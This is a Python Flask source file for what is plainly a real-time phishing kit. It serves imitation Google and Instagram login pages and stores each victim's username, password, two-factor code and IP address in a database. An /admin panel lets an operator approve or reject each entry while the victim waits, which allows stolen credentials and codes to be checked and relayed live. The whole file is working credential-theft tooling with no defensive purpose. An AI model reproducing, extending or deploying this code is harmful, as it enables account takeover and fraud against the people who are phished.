from flask import *
import flask
import random
import sys
import string
import os
import time
from datetime import datetime
import sqlite3
import factory

config_file = open(sys.argv[1], "r")
with config_file as cf:
    config_text = cf.read()
    cf.close()
    config_lines = config_text.split(";")
    config_keys = {}
    for config_line in config_lines:
        config_key = config_line.split("=")
        try:
            config_keys[config_key[0].replace("\n", "")] = config_key[1]
        except:
            None
print(config_keys)

local_server_adress = config_keys["local_server_adress"]
internet_server_adress = config_keys["internet_server_adress"]
server_directory = config_keys["server_directory"]
sleep_time = int(config_keys["sleep_time"])
max_time = int(config_keys["max_time"])
admin_password = config_keys["admin_password"]
encryption_password = config_keys["encryption_password"]
database_path = "main.db"

factory.server_directory = server_directory
factory.database_path = "main.db"

networks = {"google": ["google_login.html", ".box_input {border: 2px solid #db0d29;}", "google_login_password.html", ".box_input {border: 2px solid #db0d29;}", "google_login_code.html", ".box_input {border: 2px solid #db0d29;}"],
            "instagram": ["instagram_loginpassword.html", ".box_main #bad_username {display: block;}", "instagram_loginpassword.html", ".box_main #bad_password {display: block;}", "instagram_loginpassword_code.html", ".box_main #bad_code {display: block;}"]
            }

enc = factory.encryption(encryption_password)
settings = factory.settings()
app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    if request.method == "GET":
        cookie = request.cookies.get("session")
        def random_generator(size=6, chars=string.ascii_uppercase + string.digits):
            return ''.join(random.choice(chars) for x in range(size))
        if cookie == None:
            database_connection = sqlite3.connect(server_directory + database_path)
            database_cursor = database_connection.cursor()
            cookie = random_generator(size=10)
            database_cursor.execute("INSERT INTO accesses values(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (cookie, datetime.now().strftime("%d/%m/%Y %H:%M:%S"), request.remote_addr, request.args.get("network"), request.args.get("name"), "", "", "", "M", "M", "M", "M", ))
            database_connection.commit()
            database_connection.close()
        else:
            database_connection = sqlite3.connect(server_directory + database_path)
            database_cursor = database_connection.cursor()
            if len(database_cursor.execute("select * from accesses where cookie==?;", (cookie, )).fetchall()) == 0:
                cookie = random_generator(size=10)
                database_cursor.execute("INSERT INTO accesses values(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (cookie, datetime.now().strftime("%d/%m/%Y %H:%M:%S"), request.remote_addr, request.args.get("network"), request.args.get("name"), "", "", "", "M", "M", "M", "M", ))
            database_connection.commit()
            database_connection.close()

        network = request.args.get("network")
        if network == None:
            networks_menu = ""
            for network in networks:
                networks_menu += "<a href=\"http://" + internet_server_adress + "/?network=" + network + "\">" + network + "</a></br>"
            return networks_menu
        try:
            networks[network]
            response = make_response(render_template(networks[network][0]))
            response.set_cookie("session", cookie)
        except KeyError:
            response = make_response("no network selected")
            response.set_cookie("session", cookie)
        return response
@app.route("/step", methods=["POST"])
def step():
    cookie = request.cookies.get("session")
    if cookie == None:
        return """<head><meta http-equiv="Refresh" content="0; URL=http://""" + internet_server_adress + """/"></head>"""
    else:
        database_connection = sqlite3.connect(server_directory + database_path)
        database_cursor = database_connection.cursor()
        if len(database_cursor.execute("select * from accesses where cookie==?;", (cookie, )).fetchall()) == 0:
            return """<head><meta http-equiv="Refresh" content="0; URL=http://""" + internet_server_adress + """/"></head>"""
    s = factory.Session(cookie)
    if request.method == "GET":
        return "invalid request"
    step_number = request.form.get("step_number")
    if step_number == "1":
        username = request.form.get("username")
        s.set("step1", username)
        s.save()
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Pstep2 == "N":
                    s.set("step1", "")
                    s.save()
                elif settings.auto_Pstep2 == "Y":
                    s.set("step1", username)
                    s.save()
                return False
            if s.Pstep2 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        possible = s.Pstep2
        if possible == "M":
            if settings.auto_Pstep2 == "Y":
                s.set("Pstep2", "Y")
                s.save()
                return render_template(networks[s.network][2], username=username)
            elif settings.auto_Pstep2 == "N":
                return render_template(networks[s.network][0], adictional_style=networks[s.network][1])
                s.set("step1", "")
                s.save()
        elif possible == "Y":
            s.set("step1", username)
            s.save()
            print(s.network)
            return render_template(networks[s.network][2], username=username)
        elif possible == "N":
            s.set("step1", "")
            s.set("Pstep2", "M")
            s.save()
            return render_template(networks[s.network][0], adictional_style=networks[s.network][1])
        else:
            return "invalid request"
    elif step_number == "2":
        password = request.form.get("password")
        s.set("step2", password)
        s.save()
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Pstep3 == "N":
                    s.set("step2", "")
                    s.save()
                elif settings.auto_Pstep3 == "Y":
                    s.set("step2", password)
                    s.save()
                return False
            if s.Pstep3 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        if s.Pstep3 == "N":
            s.set("step2", "")
            s.set("Pstep3", "M")
            s.save()
            return render_template(networks[s.network][2], adictional_style=networks[s.network][3], username=s.step1)
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Nstep3 == "N":
                    s.set("step2", password)
                    s.save()
                elif settings.auto_Nstep3 == "Y":
                    s.set("step2", password)
                    s.save()
                return False
            if s.Nstep3 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        s.reload()
        possible = s.Pstep3
        needed = s.Nstep3
        if possible == "M":
            if needed == "M":
                if settings.auto_Pstep3 == "Y":
                    if settings.auto_Nstep3 == "N":
                        s.set("Pstep3", "Y")
                        s.set("Nstep3", "N")
                        s.save()
                        return render_template("final_content.html")
                    elif settings.auto_Nstep3 == "Y":
                         s.set("Pstep3", "Y")
                         s.set("Nstep3", "Y")
                         s.save()
                         return render_template(networks[s.network][4], username=s.step1)
                elif settings.auto_Pstep3 == "N":
                    s.set("step3", "")
                    s.set("Pstep3", "M")
                    s.save()
                    return render_template(networks[s.network][2], adictional_style=networks[s.network][3], username=s.step1)
            elif needed == "Nstep3::Y":
                if settings.auto_Pstep3 == "Y":
                    return render_template(networks[s.network][4], username=s.step1)
                elif settings.auto_Pstep3 == "N":
                    return render_template(networks[s.network][2], adictional_style=networks[s.network][3], username=s.step1)
        elif possible == "Y":
            if needed == "M":
                if settings.auto_Nstep3 == "N":
                    s.set("Nstep3", "N")
                    s.save()
                    return render_template("final_content.html")
                elif settings.auto_Nstep3 == "Y":
                    s.set("Nstep3", "Y")
                    s.save()
                    return render_template(networks[s.network][4], username=s.step1)
            elif needed == "N":
                return render_template("final_content.html")
            elif needed == "Y":
                return render_template(networks[s.network][4], username=s.step1)
        elif possible == "N":
            return render_template(networks[s.network][2], adictional_style=networks[s.network][3], username=s.step1)
        else:
            return "invalid request"
    elif step_number == "12":
        username = request.form.get("username")
        password = request.form.get("password")
        s.set("step1", username)
        s.set("step2", password)
        s.save()
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Pstep2 == "N":
                    s.set("step1", "")
                    s.set("Pstep2", "N")
                    s.save()
                elif settings.auto_Pstep2 == "Y":
                    s.set("step1", username)
                    s.set("Pstep2", "Y")
                    s.save()
                return False
            if s.Pstep2 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        possible = s.Pstep2
        if possible == "N":
            s.set("Pstep2", "M")
            s.save()
            return render_template(networks[s.network][0], adictional_style=networks[s.network][1])
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Pstep3 == "N":
                    s.set("step2", "")
                    s.set("Pstep3", "N")
                    s.save()
                elif settings.auto_Pstep3 == "Y":
                    s.set("step2", password)
                    s.set("Pstep3", "Y")
                    s.save()
                return False
            if s.Pstep3 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        possible = s.Pstep3
        if possible == "N":
            s.set("Pstep3", "M")
            s.save()
            return render_template(networks[s.network][2], adictional_style=networks[s.network][3])
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Nstep3 == "N":
                    s.set("Nstep3", "N")
                    s.save()
                elif settings.auto_Nstep3 == "Y":
                    s.set("step2", password)
                    s.set("Nstep3", "Y")
                    s.save()
                return False
            if s.Nstep3 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        needed = s.Nstep3
        if needed == "Y":
            return render_template(networks[s.network][4])
        else:
            return render_template("final_content.html")
    elif step_number == "3":
        code = request.form.get("code")
        s.set("step3", code)
        s.save()
        total_time = 0
        def check(sleep_time, total_time):
            time.sleep(sleep_time)
            total_time = total_time + sleep_time
            s.reload()
            if total_time >= max_time:
                if settings.auto_Pstep4 == "N":
                    s.set("step3", code)
                    s.save()
                elif settings.auto_Pstep4 == "Y":
                    s.set("step3", code)
                    s.save()
                return False
            if s.Pstep4 == "M":
                check(sleep_time, total_time)
            return True
        check(sleep_time, total_time)
        possible = s.Pstep4
        if possible == "M":
            if settings.auto_Pstep4 == "Y":
                s.set("Pstep4", "Y")
                s.save()
                return render_template("final_content.html")
            elif settings.auto_Pstep4 == "N":
                s.set("step3", "")
                s.save()
                return render_template(networks[s.network][4], adictional_style=networks[s.network][5], username=s.step1)
        elif possible == "Y":
            return render_template("final_content.html")
        elif possible == "N":
            s.set("step3", "")
            s.set("Pstep4", "M")
            s.save()
            return render_template(networks[s.network][4], adictional_style=networks[s.network][5], username=s.step1)
        else:
            return "invalid request"
@app.route("/admin", methods=["GET"])
def admin():
    database_connection = sqlite3.connect(server_directory + "main.db")
    database_cursor = database_connection.cursor()
    sessions_tuples = database_cursor.execute("select cookie from accesses order by cookie ASC;").fetchall()
    database_cursor.close()
    sessions = []
    for session in sessions_tuples:
         sessions.append(str(session[0]))
    print(sessions)
    times = []
    ips = []
    networks = []
    link_names = []
    steps1 = []
    steps2 = []
    steps3 = []
    Psteps2 = []
    Psteps3 = []
    Nsteps3 = []
    Psteps4 = []
    code = ""
    counter = 0
    enc = factory.encryption(encryption_password)
    try:
        arguments = enc.decrypt(request.args.get("arguments").encode("utf-8")).decode("utf-8").split(";")
        arguments_parsed = {}
        for argument in arguments:
            try:
                arguments_parsed[argument.split("=")[0]] = argument.split("=")[1]
            except IndexError:
                continue
    except AttributeError:
        arguments_parsed = {"command": None}
    if request.args.get("password") == admin_password:
        if arguments_parsed["command"] == None:
            for cookie in sessions:
                s = factory.Session(cookie)
                times.append(s.time)
                ips.append(s.IP)
                networks.append(s.network)
                link_names.append(s.link_name)
                steps1.append(s.step1)
                steps2.append(s.step2)
                steps3.append(s.step3)
                Psteps2.append(s.Pstep2)
                Psteps3.append(s.Pstep3)
                Nsteps3.append(s.Nstep3)
                Psteps4.append(s.Pstep4)
            for time in times:
                code = code + "<tr>"
                code = code + "<td id=\"cookie\">" + sessions[counter] + "</td>"
                code = code + "<td id=\"time\">" + times[counter] + "</td>"
                code = code + "<td id=\"ip\">" + ips[counter] + "</td>"
                code = code + "<td id=\"network\">" + str(networks[counter]) + "</td>"
                code = code + "<td id=\"link_name\">" + str(link_names[counter]) + "</td>"
                if Psteps2[counter] == "N":
                    code = code + "<td id=\"username\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep2&value=M\')\" style=\"color: red;\">| " + steps1[counter] + " |</div></td>"
                elif Psteps2[counter] == "Y":
                    code = code + "<td id=\"username\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep2&value=M\')\" style=\"color: green;\">| " + steps1[counter] + " |</div></td>"
                elif Psteps2[counter] == "M":
                    code = code + "<td id=\"username\"><p style=\"color: blue;\">|" + steps1[counter] + "|</p><div style=\"text-align: center;\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep2&value=N\')\" style=\"color: red; margin-right: 2px;\">NO</div><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep2&value=Y\')\" style=\"color: green; margin-left: 2px;\">YES</div></div></td>"
                else:
                    code = code + "<td>ERROR</td>"
                #
                if Psteps3[counter] == "N":
                    code = code + "<td id=\"password\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep3&value=M\')\" style=\"color: red;\">| " + steps2[counter] + " |</div></td>"
                elif Psteps3[counter] == "Y":
                    code = code + "<td id=\"password\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep3&value=M\')\" style=\"color: green;\">| " + steps2[counter] + " |</div></td>"
                elif Psteps3[counter] == "M":
                    code = code + "<td id=\"password\"><p style=\"color: blue;\">|" + steps2[counter] + "|</p><div style=\"text-align: center;\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep3&value=N\')\" style=\"color: red; margin-right: 2px;\">NO</div><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep3&value=Y\')\" style=\"color: green; margin-left: 2px;\">YES</div></div></td>"
                else:
                    code = code + "<td>ERROR</td>"
                #
                if Nsteps3[counter] == "N":
                    code = code + "<td id=\"NS3\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Nstep3&value=M\')\" style=\"color: red;\">" + "N" + "</div></td>"
                elif Nsteps3[counter] == "Y":
                    code = code + "<td id=\"NS3\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Nstep3&value=M\')\" style=\"color: green;\">" + "Y" + "</div></td>"
                elif Nsteps3[counter] == "M":
                    code = code + "<td id=\"NS3\"><p style=\"color: blue;\">|" + Nsteps3[counter] + "|</p><div style=\"text-align: center;\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Nstep3&value=N\')\" style=\"color: red; margin-right: 2px;\">NO</div><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Nstep3&value=Y\')\" style=\"color: green; margin-left: 2px;\">YES</div></div></td>"
                else:
                    code = code + "<td>ERROR</td>"
                #
                if Psteps4[counter] == "N":
                    code = code + "<td id=\"S3\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep4&value=M\')\" style=\"color: red;\">| " + steps3[counter] + " |</div></td>"
                elif Psteps4[counter] == "Y":
                    code = code + "<td id=\"S3\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep4&value=M\')\" style=\"color: green ;\">| " + steps3[counter] + " |</div></td>"
                elif Psteps4[counter] == "M":
                    code = code + "<td id=\"S3\"><p style=\"color: blue;\">|" + steps3[counter] + "|</p><div style=\"text-align: center;\"><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep4&value=N\')\" style=\"color: red; margin-right: 2px;\">NO</div><div onclick=\"get(\'http://" + internet_server_adress + "/admin?password=" + admin_password + "&command=set&cookie=" + sessions[counter] + "&step=Pstep4&value=Y\')\" style=\"color: green; margin-left: 2px;\">YES</div></div></td>"
                else:
                    code = code + "<td>ERROR</td>"
                #
                code = code + "<td id=\"controll\"><div onclick=\"get(\'admin?password=" + admin_password + "&command=del&cookie=" + sessions[counter].replace(".txt", "") + "\')\" style=\"color: red;\">DEL</a></td>"
                counter = counter + 1
                code = code + "</tr>"
            if settings.auto_Pstep2 == "Y":
                Rauto_Pstep2 = "N"
            else:
                Rauto_Pstep2 = "Y"
            if settings.auto_Pstep3 == "Y":
                Rauto_Pstep3 = "N"
            else:
                Rauto_Pstep3 = "Y"
            if settings.auto_Nstep3 == "Y":
                Rauto_Nstep3 = "N"
            else:
                Rauto_Nstep3 = "Y"
            if settings.auto_Pstep4 == "Y":
                Rauto_Pstep4 = "N"
            else:
                Rauto_Pstep4 = "Y"
            template = render_template("admin.html", server_date_time=datetime.now().strftime("%d/%m/%Y %H:%M:%S"), code=code, password=admin_password, adress=internet_server_adress, auto_Pstep2=settings.auto_Pstep2, auto_Pstep3=settings.auto_Pstep3, auto_Nstep3=settings.auto_Nstep3, auto_Pstep4=settings.auto_Pstep4, Rauto_Pstep2=Rauto_Pstep2, Rauto_Pstep3=Rauto_Pstep3, Rauto_Nstep3=Rauto_Nstep3, Rauto_Pstep4=Rauto_Pstep4)
            parsed_template = template.split("span")
            parsed_template_body = parsed_template[1].replace("</div></body>\n</html>", "")
            encrypted_parsed_template_body = enc.encrypt(parsed_template_body.replace("id=\"table_container\" class=\"table_container\">", ""))
            template = parsed_template[0] + "span id=\"table_container\" class=\"table_container\">" + encrypted_parsed_template_body.decode("utf-8") + "</span></body>\n</html>"
            return template
        elif arguments_parsed["command"] == "option":
            try:
                step = arguments_parsed["step"]
                value = arguments_parsed["value"]
                settings.set(step, value)
                return "Successful"
            except IndexError:
                return "Invalid request (missing arguments)"
        elif arguments_parsed["command"] == "set":
            try:
                step = arguments_parsed["step"]
                value = arguments_parsed["value"]
                cookie = arguments_parsed["cookie"]
            except IndexError:
                return "invalid request (missing arguments)"
            s = factory.Session(cookie)
            s.set(step, value)
            s.save()
            return "Successful"
        elif arguments_parsed["command"] == "del":
            try:
                cookie = arguments_parsed["cookie"]
            except IndexError:
                return "Invalid request (missing arguments)"
            s = factory.Session(cookie)
            s.delete()
            return "Successful"
    elif admin_password == None:
        return "Invalid request (Missing admin password)"
    else:
        return "invalid admin password"
if __name__ == '__main__':
    app.run(host=local_server_adress, debug=False, port="80")
